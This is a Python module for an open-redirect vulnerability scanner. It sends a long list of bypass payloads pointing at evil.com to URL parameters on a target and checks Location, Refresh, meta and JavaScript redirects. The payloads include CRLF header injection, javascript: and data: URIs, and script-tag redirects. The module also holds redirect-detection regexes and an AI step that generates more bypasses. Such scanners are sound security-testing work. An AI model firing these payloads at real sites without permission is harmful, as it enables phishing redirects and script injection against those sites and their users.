import requests
import re
from urllib.parse import urljoin, urlparse, urlencode, parse_qs, urlunparse, quote, unquote
from utils.output import section, info, success, warning, error, result
from utils.ollama_helper import OllamaHelper

REDIRECT_PAYLOADS = [
    ("https://evil.com", "absolute https"),
    ("http://evil.com", "absolute http"),
    ("//evil.com", "protocol relative"),
    ("https://evil.com/evil", "absolute with path"),
    ("/\\evil.com", "backslash trick"),
    ("/\\/evil.com", "double backslash"),
    ("https://evil.com@real.com", "credentials @"),
    ("https://evil.com%2F@real.com", "encoded @"),
    ("https://evil.com%2Frealfile", "encoded path"),
    ("https://evil.com.evildomain.com", "subdomain confusion"),
    ("https://evil.com/", "trailing slash"),
    ("javascript:alert(1)", "javascript protocol"),
    ("data:text/html,<script>alert(1)</script>", "data protocol"),
    ("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", "data base64"),
    ("vbscript:msgbox(1)", "vbscript protocol"),
    ("%68%74%74%70%73://evil.com", "URL-encoded protocol"),
    ("https://evil.com%23fragment", "hash in URL"),
    ("https://evil.com%3Fparam=1", "query in URL"),

    ("https://evil.com/%2e%2e", "double dot encoded"),
    ("https://evil.com/..;/", "path traversal semicolon"),
    ("https://evil.com%00", "null byte in URL"),
    ("https://evil.com\r\n", "CRLF injection"),
    ("https://evil.com\r\nLocation: javascript:alert(1)", "CRLF header inject"),
    ("https://evil.com%0d%0a", "CRLF encoded"),

    (" https://evil.com", "leading space"),
    ("\thttps://evil.com", "leading tab"),
    ("\nhttps://evil.com", "leading newline"),
    ("https://evil.com ", "trailing space"),
    ("https://evil.com\t", "trailing tab"),

    ("https://evil.xn--tst", "unicode domain"),
    ("https://evil\u3002com", "unicode dot"),
    ("https://evil．com", "fullwidth dot"),
    ("https://evil。com", "CJK dot"),

    ("javascript://%0aalert(1)", "JS newline bypass"),
    ("javascript:&#97;&#108;&#101;&#114;&#116;(1)", "JS entity encode"),
    ("\x00javascript:alert(1)", "null JS prefix"),
    (" JaVaScRiPt:alert(1)", "mixed case + space"),

    ("https://evil.com\\@real.com", "backslash @ bypass"),
    ("https://evil.com:443@real.com", "port @ bypass"),
    ("https://evil.com%5C@real.com", "encoded backslash @"),
    ("https://evil.com%2f@evil.com", "encoded slash @"),

    ("https://evil.com#@real.com", "hash @ bypass"),
    ("https://evil.com/?@real.com", "query @ bypass"),
    ("https://evil.com/;@real.com", "semicolon @ bypass"),

    ("https://evil.com.evil.com", "double domain"),
    ("https://evil.com.com", "TLD repetition"),
    ("https://evil.com.real.com", "subdomain reverse"),
    ("https://www.evil.com@www.real.com", "complex @"),

    ("https://evil:password@real.com", "username:password @"),
    ("https://evil%3Apassword@real.com", "encoded colon @"),
    ("http://evil#@real.com", "hash separator"),

    ("/https://evil.com", "relative with protocol"),
    ("//https://evil.com", "double protocol"),
    ("///https://evil.com", "triple slash protocol"),
    ("https://evil.com/..", "parent dir"),
    ("/..", "relative parent"),

    ("https://evil.com/%2f..%2f..%2f", "encoded traversal"),
    ("%2f%2fevil.com", "double encoded"),
    ("%2f%2fevil%2ecom", "fully encoded"),

    ("<?xml?><script>window.location='https://evil.com'</script>", "XML+JS redirect"),
    ("<script>window.location.href='https://evil.com'</script>", "JS redirect"),
    ("<script>location='https://evil.com'</script>", "Location redirect"),
    ("<script>window.location.replace('https://evil.com')</script>", "Location replace"),
    ("<script>document.location='https://evil.com'</script>", "Doc location"),
]

REDIRECT_PARAMS = [
    "url", "redirect", "redirect_uri", "redirect_url", "redirect_to", "redirectto",
    "next", "continue", "return", "return_to", "return_url", "return_path", "return-uri",
    "dest", "destination", "target", "link", "go", "goto", "click",
    "forward", "forward_to", "fwd", "to", "out", "view", "from",
    "file", "document", "download", "path", "page", "site", "html",
    "ref", "referer", "referrer", "source", "u", "uri", "urls",
    "loc", "location", "href", "action", "redirect-uri", "callback",
    "return_uri", "success_url", "fail_url", "cancel_url", "error_url",
    "checkout_url", "continue_url", "shop_url", "site_url",
    "image_url", "img_url", "pic_url", "photo_url",
    "avatar_url", "profile_url", "home_url", "back_url",
    "service_url", "api_url", "endpoint", "webhook_url",
    "redirectUrl", "redirectUri", "returnUrl", "continueUrl",
]

JS_REDIRECT_PATTERNS = [
    r'window\.location\s*=\s*["\']([^"\']+)',
    r'window\.location\.href\s*=\s*["\']([^"\']+)',
    r'window\.location\.replace\s*\(\s*["\']([^"\']+)',
    r'window\.location\.assign\s*\(\s*["\']([^"\']+)',
    r'location\s*=\s*["\']([^"\']+)',
    r'location\.href\s*=\s*["\']([^"\']+)',
    r'document\.location\s*=\s*["\']([^"\']+)',
    r'document\.location\.href\s*=\s*["\']([^"\']+)',
    r'document\.location\.replace\s*\(\s*["\']([^"\']+)',
    r'document\.URL\s*=\s*["\']([^"\']+)',
    r"window\.open\s*\(\s*['\"]((?:https?:)?//[^'\"]+)",
    r'<meta\s+http-equiv=["\']refresh["\'][^>]*content=["\'][^"\']*url=([^"\']+)',
    r'window\.navigate\s*\(\s*["\']([^"\']+)',
    r"top\.location\s*=\s*['\"]([^'\"]+)",
    r"self\.location\s*=\s*['\"]([^'\"]+)",
    r"parent\.location\s*=\s*['\"]([^'\"]+)",
    r"opener\.location\s*=\s*['\"]([^'\"]+)",
]

DOMAIN_THREAT_INDICATORS = ["evil", "malicious", "malware", "phish", "hack", "exploit", "pwn", "shell", "xss", "csrf"]


class AdvancedOpenRedirectChecker:
    name = "openredirect"
    description = "Advanced open redirect scanner (validation bypass, JS/Html discovery, DOM-based, CRLF, param pollution)"

    @staticmethod
    def run(target, timeout=10, ollama_model=None):
        section(f"Advanced Open Redirect Scanner: {target}")

        ollama = OllamaHelper(model=ollama_model) if ollama_model else None

        if not target.startswith(("http://", "https://")):
            target = f"https://{target}"

        parsed = urlparse(target)
        params = parse_qs(parsed.query)
        all_results = []

        section("Phase 1: URL Parameter-Based Redirect Testing")
        if params:
            info(f"Testing {len(params)} existing parameter(s) with {len(REDIRECT_PAYLOADS)} payload variants...")

            for param in params:
                original_value = params[param][0]
                for payload, payload_name in REDIRECT_PAYLOADS:
                    try:
                        test_params = {k: v[0] for k, v in params.items()}
                        test_params[param] = payload
                        qs = urlencode(test_params)
                        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, qs, parsed.fragment))

                        resp = requests.get(test_url, timeout=timeout, allow_redirects=False,
                            headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"})

                        AdvancedOpenRedirectChecker.analyze_response(resp, param, payload, payload_name, "url_param", all_results)

                        status = resp.status_code
                        location = resp.headers.get("Location", "")
                        if location and (urlparse(location).netloc or "//" in location[:2]):
                            if any(indicator in location.lower() for indicator in DOMAIN_THREAT_INDICATORS):
                                pass
                    except Exception as e:
                        error(f"[{param}] [{payload_name}] Error: {e}")

        if ollama and ollama.available:
            section("Phase 0: Ollama Custom Redirect Bypass Payloads")
            ai_bypasses = ollama.generate_redirect_bypasses(target)
            if ai_bypasses and params:
                info(f"Ollama generated {len(ai_bypasses)} bypass payloads")
                for param in params:
                    for payload in ai_bypasses[:8]:
                        try:
                            test_params = {k: v[0] for k, v in params.items()}
                            test_params[param] = payload
                            qs = urlencode(test_params)
                            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, qs, parsed.fragment))
                            resp = requests.get(test_url, timeout=timeout, allow_redirects=False,
                                headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"})
                            AdvancedOpenRedirectChecker.analyze_response(resp, param, payload, "Ollama AI", "ollama_bypass", all_results)
                        except:
                            pass

        section("Phase 2: Parameter Discovery via Common Redirect Params")
        info(f"Testing {len(REDIRECT_PARAMS)} common redirect parameter names...")
        for param in REDIRECT_PARAMS[:20]:
            for payload, payload_name in REDIRECT_PAYLOADS[:5]:
                try:
                    sep = "?" if "?" not in target else "&"
                    test_url = f"{target.rstrip('/')}{sep}{param}={quote(payload)}"
                    resp = requests.get(test_url, timeout=timeout, allow_redirects=False,
                        headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"})

                    AdvancedOpenRedirectChecker.analyze_response(resp, param, payload, payload_name, "discovered_param", all_results)
                except Exception as e:
                    pass

        section("Phase 3: JS-Based and HTML-Based Redirect Detection")
        try:
            resp = requests.get(target, timeout=timeout, allow_redirects=True,
                headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"})

            body = resp.text
            for pattern in JS_REDIRECT_PATTERNS:
                matches = re.findall(pattern, body, re.I)
                for match in matches[:3]:
                    parsed_url = urlparse(match)
                    if parsed_url.netloc and parsed_url.netloc != parsed.netloc:
                        warning(f"  JS redirect to external domain: {match[:100]}")
                        all_results.append({
                            "param": "js_redirect", "payload": match[:100], "payload_name": "JS redirect",
                            "redirect_to": match[:200], "detected_in": "response_body",
                        })
        except Exception as e:
            error(f"Could not fetch page for JS analysis: {e}")

        section("Phase 4: Blind Redirect Testing via Redirect Chains")
        for r in all_results:
            redirect_to = r.get("redirect_to", "")
            if redirect_to and redirect_to.startswith("http"):
                try:
                    chain_resp = requests.get(redirect_to, timeout=timeout, allow_redirects=True,
                        headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"})
                    r["final_status"] = chain_resp.status_code
                    r["final_url"] = chain_resp.url
                    if "evil" in chain_resp.url.lower():
                        warning(f"  Redirect chain leads to external: {chain_resp.url}")
                except:
                    pass

        section("Open Redirect Scan Summary")
        confirmed = [r for r in all_results if r.get("confirmed")]
        total = len(all_results)
        if confirmed:
            error(f"CONFIRMED OPEN REDIRECTS: {len(confirmed)}")
            for r in confirmed:
                result(f"  [{r['param']}]", f"{r['payload_name']} -> {r.get('redirect_to','?')[:80]}")
                result(f"       Detection:", f"{r.get('detection_indicator','direct_location_header')}")
        elif total > 0:
            warning(f"Potential redirects: {total} (requires manual verification)")
            for r in all_results[:10]:
                result(f"  [{r['param']}]", f"{r['payload_name']} -> {r.get('redirect_to','?')[:60]}")
        else:
            success("No open redirects detected")

        return {"target": target, "results": all_results}

    @staticmethod
    def analyze_response(resp, param, payload, payload_name, test_type, all_results):
        location = resp.headers.get("Location", "").strip()
        refresh_header = resp.headers.get("Refresh", "").strip()
        body = resp.text
        status = resp.status_code

        detection_methods = []

        if location:
            if payload in location or payload.rstrip("/") in location or payload.rstrip("/") == unquote(location).rstrip("/"):
                detection_methods.append("direct_location_header")
                r = {"param": param, "payload": payload, "payload_name": payload_name,
                     "redirect_to": location, "status": status, "type": "direct_301_302",
                     "confirmed": True, "detection_indicator": "Location header",
                     "test_type": test_type}
                warning(f"[{test_type}:{param}] [{payload_name}] Redirect -> {location[:80]}")
                all_results.append(r)
                return

            parsed_location = urlparse(location)
            if parsed_location.scheme and parsed_location.netloc:
                if "evil" in location.lower() or "attacker" in location.lower() or "xss" in location.lower():
                    detection_methods.append("external_redirect")
                    r = {"param": param, "payload": payload, "payload_name": payload_name,
                         "redirect_to": location, "status": status, "type": "external",
                         "confirmed": True, "detection_indicator": "External Location header",
                         "test_type": test_type}
                    warning(f"[{test_type}:{param}] [{payload_name}] External redirect to {location[:60]}")
                    all_results.append(r)
                    return
                else:
                    r = {"param": param, "payload": payload, "payload_name": payload_name,
                         "redirect_to": location, "status": status, "type": "external_unverified",
                         "confirmed": False, "detection_indicator": f"Location to {parsed_location.netloc}",
                         "test_type": test_type}
                    warning(f"[{test_type}:{param}] [{payload_name}] Location to {parsed_location.netloc}")
                    all_results.append(r)
                    return

        if refresh_header:
            url_match = re.search(r"url=([^\s;'\"]+)", refresh_header, re.I)
            if url_match:
                refresh_url = unquote(url_match.group(1))
                if payload in refresh_url:
                    r = {"param": param, "payload": payload, "payload_name": payload_name,
                         "redirect_to": refresh_url, "status": status, "type": "refresh_header",
                         "confirmed": True, "detection_indicator": "Refresh header",
                         "test_type": test_type}
                    warning(f"[{test_type}:{param}] [{payload_name}] Refresh header redirect -> {refresh_url[:60]}")
                    all_results.append(r)
                    return

        if status in (301, 302, 303, 307, 308):
            if not location:
                r = {"param": param, "payload": payload, "payload_name": payload_name,
                     "redirect_to": "(no Location header)", "status": status, "type": "redirect_no_location",
                     "confirmed": False, "detection_indicator": f"HTTP {status} without Location",
                     "test_type": test_type}
                info(f"[{test_type}:{param}] [{payload_name}] HTTP {status} without Location header")
                all_results.append(r)

        for pattern in JS_REDIRECT_PATTERNS:
            js_matches = re.findall(pattern, body, re.I)
            for js_match in js_matches:
                if payload[:30] in js_match or "evil" in js_match.lower():
                    r = {"param": param, "payload": payload, "payload_name": payload_name,
                         "redirect_to": js_match[:100], "status": status, "type": "js_redirect",
                         "confirmed": True, "detection_indicator": "JS redirect in body",
                         "test_type": test_type}
                    warning(f"[{test_type}:{param}] [{payload_name}] JS redirect: {js_match[:80]}")
                    all_results.append(r)
                    return

        meta_refresh = re.search(r'<meta\s+http-equiv=["\']refresh["\'][^>]*content=["\']\d+;\s*url=([^"\']+)', body, re.I)
        if meta_refresh:
            meta_url = unquote(meta_refresh.group(1))
            if payload[:30] in meta_url or "evil" in meta_url.lower():
                r = {"param": param, "payload": payload, "payload_name": payload_name,
                     "redirect_to": meta_url[:100], "status": status, "type": "meta_refresh",
                     "confirmed": True, "detection_indicator": "Meta refresh",
                     "test_type": test_type}
                warning(f"[{test_type}:{param}] [{payload_name}] Meta refresh: {meta_url[:80]}")
                all_results.append(r)
                return

        if status in (200, 201) and len(body) < 100 and ("window.location" in body or "location.href" in body or "document.location" in body):
            r = {"param": param, "payload": payload, "payload_name": payload_name,
                 "redirect_to": body[:100], "status": status, "type": "inline_js_redirect",
                 "confirmed": False, "detection_indicator": "Inline JS redirect",
                 "test_type": test_type}
            info(f"[{test_type}:{param}] [{payload_name}] Small response with JS redirect: {body[:80]}")
            all_results.append(r)
